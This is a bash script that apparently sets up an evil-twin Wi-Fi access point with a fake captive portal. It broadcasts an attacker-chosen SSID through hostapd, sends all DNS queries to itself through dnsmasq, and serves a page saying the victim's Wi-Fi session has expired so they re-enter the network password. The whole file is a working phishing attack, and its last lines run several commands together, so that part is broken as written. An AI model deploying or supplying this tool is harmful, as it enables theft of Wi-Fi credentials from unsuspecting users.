#!/bin/bash

# Função createpage
createpage() {
    default_cap1="Wi-fi Session for '$use_ssid' Expired!"
    default_cap2="Please login again."
    default_pass_text="Password"
    default_sub_text="Log-In"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session for SSID Expired!): \e[0m' cap1
    cap1="${cap1:-${default_cap1}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
    cap2="${cap2:-${default_cap2}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
    pass_text="${pass_text:-${default_pass_text}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
    sub_text="${sub_text:-${default_sub_text}}"

    echo "<!DOCTYPE html>" > index.html
    echo "<html>" >> index.html
    echo "<body bgcolor=\"gray\" text=\"white\">" >> index.html
    IFS=$'\n'
    printf '<center><h2> %s <br><br> %s </h2></center><center>\n' "$cap1" "$cap2" >> index.html
    IFS=$'\n'
    printf '<form method="POST" action="login.php"><label>%s </label>\n' "$pass_text" >> index.html
    IFS=$'\n'
    printf '<br><label>%s: </label>' "$pass_text" >> index.html
    IFS=$'\n'
    printf '<input type="password" name="password" length=64><br><br>\n' >> index.html
    IFS=$'\n'
    printf '<input value="%s" type="submit"></form>\n' "$sub_text" >> index.html
    printf '</center>' >> index.html
    printf '<body>\n' >> index.html
    printf '</html>\n' >> index.html
}

# Função start
start() {
    if [[ -e credentials.txt ]]; then
        rm -rf credentials.txt
    fi
    interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > iface)

    counter=1
    for i in $(cat iface); do
        printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" "$counter" "$i"
        let counter++
    done

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface to use:\e[0m ' use_interface
    choosed_interface=$(sed ''"$use_interface"'q;d' iface)
    IFS=$'\n'
    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID to use:\e[0m ' use_ssid
    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Channel to use:\e[0m ' use_channel
    createpage
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Killing all connections..\e[0m\n"
    sleep 2
    killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
    sleep 5
    printf "interface=%s\n" "$choosed_interface" > hostapd.conf
    printf "driver=nl80211\n" >> hostapd.conf
    printf "ssid=%s\n" "$use_ssid" >> hostapd.conf
    printf "hw_mode=g\n" >> hostapd.conf
    printf "channel=%s\n" "$use_channel" >> hostapd.conf
    printf "macaddr_acl=0\n" >> hostapd.conf
    printf "auth_algs=1\n" >> hostapd.conf
    printf "ignore_broadcast_ssid=0\n" >> hostapd.conf
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s down\n" "$choosed_interface"
    ifconfig "$choosed_interface" down
    sleep 4
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Setting %s to monitor mode\n" "$choosed_interface"
    iwconfig "$choosed_interface" mode monitor
    sleep 4
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s Up\n" "$choosed_interface"
    ifconfig wlan0 up
    sleep 5
    hostapd hostapd.conf > /dev/null 2>&1 &
    sleep 6
    printf "interface=%s\n" "$choosed_interface" > dnsmasq.conf
    printf "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
    printf "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
    printf "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
    printf "server=8.8.8.8\n" >> dnsmasq.conf
    printf "log-queries\n" >> dnsmasq.conf
    printf "log-dhcp\n" >> dnsmasq.conf
    printf "listen-address=127.0.0.1\n" >> dnsmasq.conf
    printf "address=/#/192.168.1.1\n" >> dnsmasq.conf ifconfig "$choosed_interface" up 192.168.1.1 netmask 255.255.255.0 sleep 1 route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1 sleep 1 dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 & sleep 5 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] To Stop: ./fakeap.sh --stop\n" server 
}

# Chamar a função start

start